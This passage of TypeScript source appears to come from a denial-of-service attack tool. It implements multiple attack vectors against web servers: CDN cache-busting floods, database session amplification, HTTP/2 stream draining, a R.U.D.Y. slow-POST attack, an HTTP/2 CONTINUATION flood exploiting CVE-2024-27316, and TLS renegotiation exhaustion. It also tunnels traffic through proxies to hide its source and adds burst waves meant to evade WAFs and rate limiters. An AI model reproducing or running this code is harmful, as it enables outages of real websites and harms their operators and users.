          const pageHdrs = buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar, p);
          try {
            const ps = conn.request(pageHdrs);
            ps.on("response", () => {
              localPkts++; localBytes += 4096;
              // Then: all sub-resources in parallel (real browser behaviour)
              const shuffled = [...SUB_TYPES].sort(() => Math.random() - 0.5).slice(0, randInt(12, SUB_TYPES.length));
              shuffled.forEach(s => fireSub(s));
            });
            ps.on("data",  () => {});
            ps.on("error", () => resolve());
            ps.on("close", () => {
              if (!signal.aborted && !conn.destroyed) {
                // Click next page
                const nx = conn.request(buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar, p));
                nx.on("response", () => { localPkts++; localBytes += 4096; });
                nx.on("data",  () => {});
                nx.on("error", () => {});
                nx.on("close", () => resolve());
                nx.end();
              } else { resolve(); }
            });
            ps.end();
          } catch { resolve(); }
        });
        conn.on("error", () => resolve());
        conn.on("close", () => resolve());
        signal.addEventListener("abort", cleanup, { once: true });
      });
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(20, 120)));
    }
  };

  // ── VECTOR III: Cache Annihilator ────────────────────────────────────────
  // Unique across ALL Vary dimensions: URL + Accept-Language + Accept-Encoding +
  // If-None-Match + POST body = guaranteed CDN miss, every request hits origin.
  const VARY_LANGS     = ["en-US,en;q=0.9","pt-BR,pt;q=0.9","es-ES,es;q=0.9","fr-FR,fr;q=0.9","de-DE,de;q=0.9","zh-CN,zh;q=0.9","ja-JP,ja;q=0.9","ko-KR,ko;q=0.9","it-IT,it;q=0.9","ru-RU,ru;q=0.9","ar-SA,ar;q=0.9","hi-IN,hi;q=0.9"];
  const VARY_ENCODINGS = ["gzip, deflate, br","gzip, deflate","br","gzip","deflate, br, zstd","gzip, br, zstd","identity"];
  const runCacheAnnihilatorSlot = async (): Promise<void> => {
    const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
    const cookieJar = new Map<string, string>();
    while (!signal.aborted) {
      const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
      const bust     = `?_=${randStr(16)}&v=${randInt(1, 2147483647)}&t=${Date.now()}&r=${randStr(8)}`;
      const fullPath = pagePath + bust;
      try {
        const ac     = new AbortController();
        const timer  = setTimeout(() => ac.abort(), 8_000);
        if (signal.aborted) { clearTimeout(timer); break; }
        const wafHdrs = buildWAFHeaders(hostname, fullPath, cookieJar, p);
        const fetchHdrs: Record<string, string> = {};
        for (const [k, v] of Object.entries(wafHdrs)) {
          if (!k.startsWith(":")) fetchHdrs[k] = v;
        }
        fetchHdrs["accept-language"]   = VARY_LANGS[randInt(0, VARY_LANGS.length)];
        fetchHdrs["accept-encoding"]   = VARY_ENCODINGS[randInt(0, VARY_ENCODINGS.length)];
        fetchHdrs["cache-control"]     = "no-cache, no-store, must-revalidate, max-age=0";
        fetchHdrs["pragma"]            = "no-cache";
        fetchHdrs["if-none-match"]     = `"${randHex(32)}"`;
        fetchHdrs["if-modified-since"] = new Date(Date.now() - randInt(1, 86400) * 1000).toUTCString();
        const isPost = Math.random() < 0.40;
        const res    = await fetch(`https://${hostname}${fullPath}`, {
          method:  isPost ? "POST" : "GET",
          signal:  ac.signal,
          headers: fetchHdrs,
          body:    isPost ? JSON.stringify({ data: randStr(64), ts: Date.now(), id: randStr(12) }) : undefined,
        });
        clearTimeout(timer);
        const body = await res.arrayBuffer().catch(() => new ArrayBuffer(0));
        localPkts++; localBytes += body.byteLength || 1024;
        const sc = res.headers.get("set-cookie");
        if (sc) { const [kv] = sc.split(";"); const [k, v] = kv.split("="); if (k && v) cookieJar.set(k.trim(), v.trim()); }
      } catch { /* absorb */ }
    }
  };

  // ── VECTOR IV: Session Amplifier ─────────────────────────────────────────
  // Full 5-step user journey per "user": landing → search → product → cart → checkout
  // Each step: server-side session lookup + DB query + auth check = compound DB load.
  const SESSION_JOURNEYS = [
    ["/", "/search?q=" + randStr(6), "/products", "/cart", "/checkout"],
    ["/", "/categories", "/products/featured", "/cart/add", "/order/confirm"],
    ["/login", "/dashboard", "/api/v1/user/settings", "/api/v1/notifications", "/logout"],
    ["/", "/blog", "/blog/post-" + randInt(1,50), "/contact", "/api/v1/newsletter"],
    ["/api/v1/products", "/api/v1/search?q=" + randStr(4), "/api/v1/cart", "/api/v1/order", "/api/v1/payment/init"],
    ["/", "/pricing", "/signup", "/api/v1/register", "/api/v1/verify"],
  ];
  const runSessionAmplifierSlot = async (): Promise<void> => {
    const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
    const cookieJar = new Map<string, string>();
    while (!signal.aborted) {
      const journey = SESSION_JOURNEYS[randInt(0, SESSION_JOURNEYS.length)];
      for (const step of journey) {
        if (signal.aborted) return;
        const isPost = /add|submit|update|login|confirm|payment|register|verify/.test(step);
        try {
          const ac    = new AbortController();
          const timer = setTimeout(() => ac.abort(), 10_000);
          if (signal.aborted) { clearTimeout(timer); break; }
          const bust     = `?_s=${randStr(8)}&uid=${randStr(12)}`;
          const wafHdrs  = buildWAFHeaders(hostname, step + bust, cookieJar, p);
          const fetchHdrs: Record<string, string> = {};
          for (const [k, v] of Object.entries(wafHdrs)) if (!k.startsWith(":")) fetchHdrs[k] = v;
          const res = await fetch(`https://${hostname}${isPost ? step : step + bust}`, {
            method:  isPost ? "POST" : "GET",
            signal:  ac.signal,
            headers: fetchHdrs,
            body:    isPost ? JSON.stringify({ csrf: randHex(32), data: randStr(32), ts: Date.now() }) : undefined,
          });
          clearTimeout(timer);
          const sc = res.headers.get("set-cookie");
          if (sc) { const [kv] = sc.split(";"); const [k, v] = kv.split("="); if (k && v) cookieJar.set(k.trim(), v.trim()); }
          await res.arrayBuffer().catch(() => {});
          localPkts++; localBytes += 2048;
          await new Promise(r => setTimeout(r, randInt(150, 600)));
        } catch { /* skip step */ }
      }
    }
  };

  // ── VECTOR VI: H2 Stream Drain (64 streams) ──────────────────────────────
  // initialWindowSize=0 → server allocates response buffer per stream, holds forever.
  // 64 frozen streams × 400 drain slots = 25,600 permanently stalled server buffers.
  const runDrainSlot = async (): Promise<void> => {
    const cookieJar = new Map<string, string>();
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          c = h2connect(target, {
            rejectUnauthorized: false, servername: hostname,
            ciphers: randomJA3Ciphers(),
            settings: { ...CHROME_H2_SETTINGS, initialWindowSize: 0 },
            ALPNProtocols: ["h2", "http/1.1"],
          });
        } catch { resolve(); return; }
        const conn    = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
        const MAX_DRAIN = 64;
        let   opened    = 0;
        const openDrain = () => {
          if (signal.aborted || conn.destroyed || opened >= MAX_DRAIN) return;
          opened++;
          try {
            const stream = conn.request(buildWAFHeaders(hostname, WAF_PATHS[randInt(0, WAF_PATHS.length)], cookieJar));
            stream.pause();
            stream.on("response", () => { localPkts++; localBytes += 512; });
            stream.on("error",    () => { opened = Math.max(0, opened - 1); });
            setTimeout(() => {
              try { stream.close(); } catch { /**/ }
              opened = Math.max(0, opened - 1);
              if (!signal.aborted && !conn.destroyed) openDrain();
            }, randInt(15_000, 40_000));
          } catch { opened = Math.max(0, opened - 1); }
        };
        conn.on("connect", () => { for (let i = 0; i < MAX_DRAIN; i++) setTimeout(openDrain, i * 25); });
        conn.on("error",   () => resolve());
        conn.on("close",   () => resolve());
        setTimeout(() => cleanup(), randInt(50_000, 90_000));
        signal.addEventListener("abort", cleanup, { once: true });
      });
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(200, 600)));
    }
  };

  // ── VECTOR VII: Adaptive Burst Mode ──────────────────────────────────────
  // Fires at T+20s. 15s waves alternate: H2-heavy → Session-heavy → MAX (all at 2×)
  // Identical philosophy to Geass Override burst — overwhelms rate limiters tuned
  // for steady-state traffic by producing sudden 1.6-2.0× spikes every 30 seconds.
  const burstLoop = async (): Promise<void> => {
    await new Promise<void>(r => setTimeout(r, 20_000));
    let wave = 0;
    while (!signal.aborted) {
      wave++;
      const bAbort = new AbortController();
      const bTimer = setTimeout(() => bAbort.abort(), 15_000);
      const bSig   = typeof (AbortSignal as { any?: unknown }).any === "function"
        ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, bAbort.signal])
        : bAbort.signal;
      const slots: Promise<void>[] = [];
      const n = wave % 3 === 0 ? 80 : wave % 2 === 0 ? 55 : 45;
      if (wave % 3 === 0) {
        // MAX: all vectors at 2× — every 3rd wave
        for (let i = 0; i < n;                    i++) slots.push(runPrimarySlot());
        for (let i = 0; i < Math.floor(n * 0.6); i++) slots.push(runSubresourceSlot());
        for (let i = 0; i < Math.floor(n * 0.4); i++) slots.push(runCacheAnnihilatorSlot());
      } else if (wave % 2 === 0) {
        // Cache + Session heavy — destroys CDN + DB
        for (let i = 0; i < n;                    i++) slots.push(runCacheAnnihilatorSlot());
        for (let i = 0; i < Math.floor(n * 0.7); i++) slots.push(runSessionAmplifierSlot());
      } else {
        // H2 + subresource heavy — raw bandwidth
        for (let i = 0; i < n; i++) slots.push(runPrimarySlot());
        for (let i = 0; i < n; i++) slots.push(runSubresourceSlot());
      }
      void Promise.all(slots).finally(() => clearTimeout(bTimer));
      await new Promise<void>(r => setTimeout(r, 15_000));
    }
  };
  void burstLoop();

  // ── Launch all 6 active vectors simultaneously ───────────────────────────
  // Vector V (origin direct) added once discovery completes — use primary slots
  // pointed at origin IP (bypasses CF edge entirely if origin IP found)
  const originSlots = (): Promise<void>[] => {
    if (originTarget === target) return [];
    return Array.from({ length: Math.floor(NUM_PRIMARY * 0.4) }, () => runPrimarySlot(originTarget));
  };

  await Promise.all([
    ...Array.from({ length: NUM_PRIMARY  }, () => runPrimarySlot()),
    ...Array.from({ length: NUM_SUBRES   }, () => runSubresourceSlot()),
    ...Array.from({ length: NUM_CACHE    }, () => runCacheAnnihilatorSlot()),
    ...Array.from({ length: NUM_SESSION  }, () => runSessionAmplifierSlot()),
    ...Array.from({ length: NUM_DRAIN    }, () => runDrainSlot()),
    ...originSlots(),
  ]);

  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  R.U.D.Y (R-U-Dead-Yet) — TRUE SLOW POST IMPLEMENTATION
//
//  Sends a POST with Content-Length: 1,000,000,000 (1 GB) then trickles
//  1-2 random bytes every 5-15 seconds. Apache/IIS/Tomcat allocate a
//  thread or goroutine per connection and hold it until the body completes.
//  With 30K connections open, the server's thread pool is completely
//  exhausted within seconds — all legitimate requests are queued forever.
//
//  Key difference from HTTP Exhaust: we NEVER send the full body.
//  The server waits indefinitely → threads = held → server = dead.
// ─────────────────────────────────────────────────────────────────────────
async function runRUDY(
  base: string,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `http://${base}`); }
    catch { return new URL("http://127.0.0.1"); }
  })();
  const isHttps    = u.protocol === "https:";
  const hostname   = u.hostname;
  const tgtPort    = parseInt(u.port) || (isHttps ? 443 : 80);
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);

  const PATHS  = ["/upload","/submit","/post","/api/upload","/api/submit","/api/data",
                  "/graphql","/form","/register","/api/import","/api/bulk","/api/batch",
                  "/api/v1/data","/api/v2/submit","/wp-login.php","/admin/login",
                  "/api/auth/login","/contact","/api/v1/user","/api/v2/create"];
  const MAX_CONN   = Math.min(threads * 100, 60000); // was 25K; 60K × 20KB TCP = 1.2GB
  const FAKE_LEN   = 1_000_000_000; // Claim 1GB body — server waits forever

  let localPkts = 0, localBytes = 0;
  const flush    = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv  = setInterval(flush, 300);

  // Each connection uses a raw TCP socket for precise byte-level control
  const oneRudy = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    const sock: net.Socket | tls.TLSSocket = isHttps
      ? tls.connect({ host: resolvedIp, port: tgtPort, servername: hostname, rejectUnauthorized: false, timeout: 900_000 })
      : net.createConnection({ host: resolvedIp, port: tgtPort });

    sock.setNoDelay(true);
    sock.setTimeout(900_000); // 15 min — hold as long as possible

    let keepIv:   NodeJS.Timeout | null = null;
    let settled   = false;

    const cleanup = (reconnect = true) => {
      if (settled) return;
      settled = true;
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (!signal.aborted && reconnect) {
        resolve(); // outer async runConn while-loop reconnects immediately
      } else { resolve(); }
    };

    const onConnected = () => {
      const path    = PATHS[randInt(0, PATHS.length)] + `?_=${randStr(8)}`;
      const ct      = Math.random() < 0.5 ? "application/x-www-form-urlencoded" : "application/json";
      // Send POST headers with enormous Content-Length — body NEVER completes
      const hdr = [
        `POST ${path} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Content-Type: ${ct}`,
        `Content-Length: ${FAKE_LEN}`,
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
        `Accept-Language: en-US,en;q=0.5`,
        `Accept-Encoding: gzip, deflate`,
        `X-Forwarded-For: ${randIp()}`,
        `X-Real-IP: ${randIp()}`,
        `Connection: keep-alive`,
        `\r\n`,
      ].join("\r\n");
      sock.write(hdr);
      localPkts++;
      localBytes += hdr.length;

      // Trickle 1-2 bytes every 5-15 seconds — holds the server thread indefinitely
      keepIv = setInterval(() => {
        if (signal.aborted || sock.destroyed) { cleanup(false); return; }
        const chunk = Buffer.from([randInt(0x61, 0x7a), randInt(0x30, 0x39)]); // random letters+digits
        const written = sock.write(chunk);
        localPkts++;
        localBytes += chunk.length;
        if (!written) { cleanup(true); } // backpressure = server overloaded
      }, randInt(5_000, 15_000));
    };

    if (isHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   () => cleanup(true));
    sock.once("timeout", () => cleanup(true));
    sock.once("close",   () => cleanup(true));

    signal.addEventListener("abort", () => {
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
  });

  const runConn = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneRudy();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 10));
    }
  };

  await Promise.all(Array.from({ length: MAX_CONN }, runConn));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP CONNECT TUNNEL — routes TCP through an HTTP proxy (RFC 7231 §4.3.6)
//  Sends "CONNECT host:port HTTP/1.1" and returns the raw socket after 200.
//  This tunnel is then used by tls.connect({socket: tunnel, ...}) so that
//  TLS-based attack methods (H2-storm, HPACK, Continuation, etc.) appear to
//  come from the proxy's IP, not the origin server.
// ─────────────────────────────────────────────────────────────────────────
function httpConnectTunnel(
  proxy:      ProxyConfig,
  targetHost: string,
  targetPort: number,
): Promise<net.Socket> {
  return new Promise((resolve, reject) => {
    const sock = net.createConnection({ host: proxy.host, port: proxy.port });
    sock.setTimeout(8_000);

    const cleanup = (e: Error) => { try { sock.destroy(); } catch {/**/} reject(e); };

    sock.once("connect", () => {
      const authHdr = proxy.username
        ? `Proxy-Authorization: Basic ${Buffer.from(`${proxy.username}:${proxy.password ?? ""}`).toString("base64")}\r\n`
        : "";
      sock.write(
        `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\n` +
        `Host: ${targetHost}:${targetPort}\r\n` +
        `Proxy-Connection: keep-alive\r\n` +
        `${authHdr}\r\n`,
      );

      let buf = "";
      const onData = (chunk: Buffer) => {
        buf += chunk.toString("latin1");
        if (!buf.includes("\r\n\r\n")) return; // wait for end of headers
        sock.removeListener("data",    onData);
        sock.removeListener("error",   onErr);
        sock.removeListener("timeout", onTmo);
        if (/HTTP\/1\.[01] 2\d\d/.test(buf)) {
          resolve(sock);
        } else {
          cleanup(new Error(`CONNECT rejected: ${buf.split("\r\n")[0]}`));
        }
      };
      const onErr = (e: Error) => { sock.removeListener("data", onData); cleanup(e); };
      const onTmo = ()        => { sock.removeListener("data", onData); cleanup(new Error("CONNECT timeout")); };
      sock.on("data",    onData);
      sock.once("error", onErr);
      sock.once("timeout", onTmo);
    });

    sock.once("error",   reject);
    sock.once("timeout", () => cleanup(new Error("proxy connect timeout")));
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  mkTLSSock — creates a TLS socket, optionally through an HTTP proxy.
//  Falls back to direct when proxy fails or no proxies provided.
// ─────────────────────────────────────────────────────────────────────────
async function mkTLSSock(
  proxies:      ProxyConfig[],
  _idx:         number,
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  alpn:         string[] = ["h2"],
  extraOpts:    Partial<tls.ConnectionOptions> = {},
): Promise<tls.TLSSocket> {
  const opts: tls.ConnectionOptions = {
    servername: hostname, rejectUnauthorized: false,
    ALPNProtocols: alpn,
    ciphers: randomJA3Ciphers(),
    ...extraOpts,
  };
  if (proxies.length > 0) {
    const proxy = pickProxy(proxies);
    try {
      const tunnel = proxy.type === "socks5"
        ? await socks5Connect(proxy, hostname, targetPort)
        : await httpConnectTunnel(proxy, hostname, targetPort);
      recordProxySuccess(proxy.host, proxy.port);
      return tls.connect({ socket: tunnel, ...opts });
    } catch { recordProxyFailure(proxy.host, proxy.port); /* proxy failed — use direct */ }
  }
  return tls.connect({ host: resolvedHost, port: targetPort, ...opts });
}

// ─────────────────────────────────────────────────────────────────────────
//  SOCKS5 PROXY TUNNEL — routes TCP through a SOCKS5 proxy
//  Protocol: RFC 1928 (SOCKS5, no-auth method 0x00)
//  Returns a raw socket already tunneled to the target
// ─────────────────────────────────────────────────────────────────────────
function socks5Connect(
  proxy: ProxyConfig,
  targetHost: string,
  targetPort: number,
): Promise<net.Socket> {
  return new Promise((resolve, reject) => {
    const sock = net.createConnection({ host: proxy.host, port: proxy.port });
    sock.setTimeout(8_000);
    let step = 0;
    const onData = (data: Buffer) => {
      if (step === 0) {
        // Step 1: greeting response — \x05\x00 = version 5, no-auth accepted
        if (data[0] !== 0x05 || data[1] !== 0x00) {
          sock.destroy(); reject(new Error("SOCKS5 auth failed")); return;
        }
        // Step 2: CONNECT request — \x05\x01\x00\x03 <domain-len> <domain> <port>
        const hostBuf = Buffer.from(targetHost);
        const req = Buffer.allocUnsafe(7 + hostBuf.length);
        req[0] = 0x05; req[1] = 0x01; req[2] = 0x00; req[3] = 0x03;
        req[4] = hostBuf.length;
        hostBuf.copy(req, 5);
        req.writeUInt16BE(targetPort, 5 + hostBuf.length);
        sock.write(req);
        step = 1;
      } else if (step === 1) {
        // Step 3: CONNECT response — \x05\x00 = success
        if (data[0] !== 0x05 || data[1] !== 0x00) {
          sock.destroy(); reject(new Error("SOCKS5 CONNECT failed")); return;
        }
        sock.removeListener("data",    onData);
        sock.removeListener("error",   onError);
        sock.removeListener("timeout", onTimeout);
        resolve(sock); // tunnel open
      }
    };
    const onError   = (e: Error) => { sock.destroy(); reject(e); };
    const onTimeout = ()         => { sock.destroy(); reject(new Error("SOCKS5 timeout")); };
    sock.once("connect", () => {
      sock.on("data", onData);
      // Greeting: \x05\x01\x00 — version 5, 1 auth method, no-auth
      sock.write(Buffer.from([0x05, 0x01, 0x00]));
    });
    sock.on("error",   onError);
    sock.on("timeout", onTimeout);
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 CONTINUATION FLOOD — CVE-2024-27316
//
//  Sends HEADERS frames with END_HEADERS=0, followed by endless CONTINUATION
//  frames (also without END_HEADERS). The server must buffer all frames in
//  a reassembly queue until it sees END_HEADERS — which never arrives.
//  Result: OOM / CPU exhaustion on the server's H2 multiplexer.
//
//  Affected: nginx ≤1.25.4, Apache httpd ≤2.4.58, Envoy, HAProxy, IIS
//  CVE severity: CVSS 7.5 (HIGH)
// ─────────────────────────────────────────────────────────────────────────
async function runH2Continuation(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  // HTTP/2 binary framing helpers
  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(streamId & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  // Client preface (RFC 7540 §3.5)
  const PREFACE    = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const SETTINGS   = mkFrame(0x04, 0x00, 0, Buffer.alloc(0)); // empty SETTINGS
  const SACK       = mkFrame(0x04, 0x01, 0, Buffer.alloc(0)); // SETTINGS ACK

  // Minimal HPACK-encoded request headers (no Huffman for simplicity)
  const makeHpack = (host: string): Buffer => {
    const h = Buffer.from(host);
    return Buffer.concat([
      Buffer.from([0x82, 0x84, 0x87]),   // :method GET, :path /, :scheme https (indexed)
      Buffer.from([0x41, h.length]), h,   // :authority literal with incremental indexing
    ]);
  };

  // CONTINUATION payload — fills each frame with 8–16 KB of garbage header data.
  // HTTP/2 spec (RFC 7540 §6.10) mandates the server buffer ALL CONTINUATION frames
  // for a stream before delivering to the app layer. Max frame size is 16384 bytes.
  // Increasing from 128-512B → 8192-16384B = 32× more RAM allocated per stream.
  // Server cannot reject mid-stream — it must buffer until END_HEADERS or connection reset.
  const makeCont = (streamId: number): Buffer => {
    const payload = Buffer.allocUnsafe(randInt(8192, 16384)); // was 128-512 — now max allowed
    for (let i = 0; i + 4 <= payload.length; i += 4)
      payload.writeUInt32LE(Math.random() * 0x100000000 >>> 0, i);
    return mkFrame(0x09, 0x00, streamId, payload); // type 0x09 = CONTINUATION, flags=0 (no END_HEADERS)
  };
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 60) : Math.min(threads, 800); // 800 slots × 150KB = 120MB per worker

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let pIdx = 0;

  const connectAndAttack = async (): Promise<void> => {
    if (signal.aborted) return;
    const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
    sock.setTimeout(30_000);
    return new Promise<void>(resolve => {

    let settled = false;
    const done = () => { if (!settled) { settled = true; resolve(); } };

    // Backpressure-aware write: if kernel buffer is full, wait for drain
    // before continuing — prevents unbounded buffer growth (OOM / silent drop)
    // Resolves on drain OR socket close/error so the Promise never leaks.
    const safeWrite = (buf: Buffer): Promise<void> => {
      if (sock.destroyed) return Promise.resolve();
      const ok = sock.write(buf);
      if (ok) return Promise.resolve();
      return new Promise<void>(r => {
        if (sock.destroyed) { r(); return; }
        const cleanup = () => { sock.off("drain", cleanup); sock.off("error", cleanup); sock.off("close", cleanup); r(); };
        sock.once("drain", cleanup);
        sock.once("error", cleanup);
        sock.once("close", cleanup);
      });
    };

    sock.once("secureConnect", () => {
      sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
      localPkts++; localBytes += PREFACE.length + 18;

      let streamId = 1;

      // Async attack loop: burst CONTINUATION frames per stream, then yield
      // Burst 50–300 × 8–16KB = 400KB–4.8MB per cycle — massive RAM pressure on server
      // while remaining within socket write-buffer bounds (checked via drain).
      const attack = async (): Promise<void> => {
        while (!signal.aborted && !sock.destroyed) {
          // HEADERS frame: END_STREAM=1 but NO END_HEADERS → forces server to buffer CONTINUATION
          const hpack = makeHpack(hostname);
          await safeWrite(mkFrame(0x01, 0x01, streamId, hpack));
          localPkts++; localBytes += 9 + hpack.length;

          // Flood CONTINUATION frames — each frame forces server to reallocate its HPACK state
          // keeping frame sizes large (8–16KB) to maximise per-stream memory on target
          const burst = randInt(50, 300);
          for (let i = 0; i < burst && !sock.destroyed; i++) {
            const cf = makeCont(streamId);
            await safeWrite(cf);
            localPkts++; localBytes += cf.length;
          }

          // RFC 7540 §5.1.1: stream IDs are monotonically increasing, never reuse on same conn
          if (streamId > 0x7FFFFF00) { sock.destroy(); done(); return; }
          streamId += 2; // client uses odd stream IDs

          // Yield to event loop between bursts so flush/drain events can fire
          await new Promise<void>(r => setImmediate(r));
        }
        done();
      };
      attack().catch(() => done());
    });

    sock.on("data",    () => {}); // drain server GOAWAY / SETTINGS frames
    // async attack() loop exits when sock.destroyed or signal.aborted → calls done().
    // Do NOT reconnect here — the async while-loop in runSlot handles reconnection.
    sock.on("timeout", () => { sock.destroy(); });
    sock.on("error",   () => { /* sock auto-destroyed; attack() will exit via sock.destroyed */ });
    sock.on("close",   () => { done(); }); // ensure inner promise settles on unexpected close
    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
    }); // end inner Promise
  }; // end connectAndAttack

  // ★ Async reconnect loop: exactly NUM_SLOTS concurrent connections at all times.
  // When a slot's connection dies, the while-loop immediately creates a new one — no
  // unbounded recursive promise accumulation, bounded memory = NUM_SLOTS × one socket.
  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await connectAndAttack();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  TLS RENEGOTIATION DoS
//
//  Forces the server to perform a full TLS handshake repeatedly while the
//  connection is alive. Each renegotiation requires a full asymmetric-key
//  operation (~3ms on modern HW) — with 200 slots each renegotiating every
//  200ms = 3,000 handshakes/sec = ~9ms of CPU per core continuously.
//
//  Only works against TLS 1.2 — TLS 1.3 removed renegotiation.
//  Most CDN origins still offer TLS 1.2 via fallback.
// ─────────────────────────────────────────────────────────────────────────
async function runTLSRenego(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 50) : Math.min(threads, 800); // 32GB: 800 RSA slots; 8vCPU handles 800 × 10 renegotiations/sec

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);
  let pIdx = 0;

  // ★ RSA cipher priority: prioritize cipher suites WITHOUT forward secrecy (ECDHE/DHE prefix).
  // Non-FS ciphers (AES256-GCM-SHA384, AES128-GCM-SHA256, etc.) use RSA key exchange.
  // TLS 1.2 RSA handshake: server must decrypt ClientKeyExchange with its RSA private key (~1ms
  // asymmetric op). ECDHE handshake: server does fast ECC multiply instead (~0.1ms). RSA is ~10×
  // more expensive — prioritizing these ciphers multiplies server CPU cost per renegotiation.
  // Non-FS first, then ECDHE fallback so we still connect if RSA-only is unsupported.
  const RSA_PRIORITY_CIPHERS = [
    "AES256-GCM-SHA384",          // RSA key exchange, no FS — most expensive per handshake
    "AES128-GCM-SHA256",          // RSA key exchange, no FS
    "AES256-SHA256",              // RSA key exchange, CBC mode
    "AES128-SHA256",              // RSA key exchange, CBC mode
    "AES256-SHA",                 // RSA key exchange, older CBC
    "AES128-SHA",                 // RSA key exchange, older CBC
    "ECDHE-RSA-AES256-GCM-SHA384",// ECDHE fallback (server may reject non-FS first)
    "ECDHE-RSA-AES128-GCM-SHA256",// ECDHE fallback
  ].join(":");

  const oneSlot = async (): Promise<void> => {
    if (signal.aborted) return;
    // Use mkTLSSock with RSA-priority ciphers + TLS 1.2 (required for renegotiation)
    const sock = await mkTLSSock(
      proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"],
      { maxVersion: "TLSv1.2" as tls.SecureVersion, ciphers: RSA_PRIORITY_CIPHERS }
    );
    sock.setTimeout(60_000);
    return new Promise<void>(resolve => {
    let settled = false;
    const done = () => { if (!settled) { settled = true; resolve(); } };

    const doRenego = () => {
      if (signal.aborted || sock.destroyed) { done(); return; }
      try {
        sock.renegotiate({ rejectUnauthorized: false }, (err) => {
          if (err || signal.aborted) { try { sock.destroy(); } catch { /**/ } done(); return; }
          localPkts++; localBytes += 2800; // ~2.8KB RSA TLS handshake (larger than ECDHE)
          // ★ v3: 20–60ms interval → 16–50 renegotiations/sec per slot (was 50–150ms / 7–20/s)
          // Tighter timing = more RSA private key operations per second on server CPU
          setTimeout(doRenego, randInt(20, 60));
        });
      } catch { done(); }
    };

    sock.once("secureConnect", () => {
      // Initial request: use OPTIONS /* to trigger CORS preflight processing (extra server work)
      sock.write(`OPTIONS * HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\nOrigin: https://${randIp()}.amazonaws.com\r\nAccess-Control-Request-Method: POST\r\n\r\n`);
      localPkts++; localBytes += 120;
      setTimeout(doRenego, 50); // start renegotiation at 50ms (was 100ms)
    });

    sock.on("data",    () => {});
    sock.on("timeout", () => { sock.destroy(); done(); });
    sock.on("error",   () => { done(); });
    sock.on("close",   () => { done(); });
    signal.addEventListener("abort", () => { try { sock.destroy(); } catch { /**/ } done(); }, { once: true });
    }); // end inner Promise
  }; // end oneSlot

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneSlot();
      // v3: 50–100ms reconnect (was 150–300ms) → faster slot recycling, more RSA work on server
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(50, 100)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  H2 SETTINGS STORM
//
//  Attack in 3 simultaneous layers on each H2 connection:
//
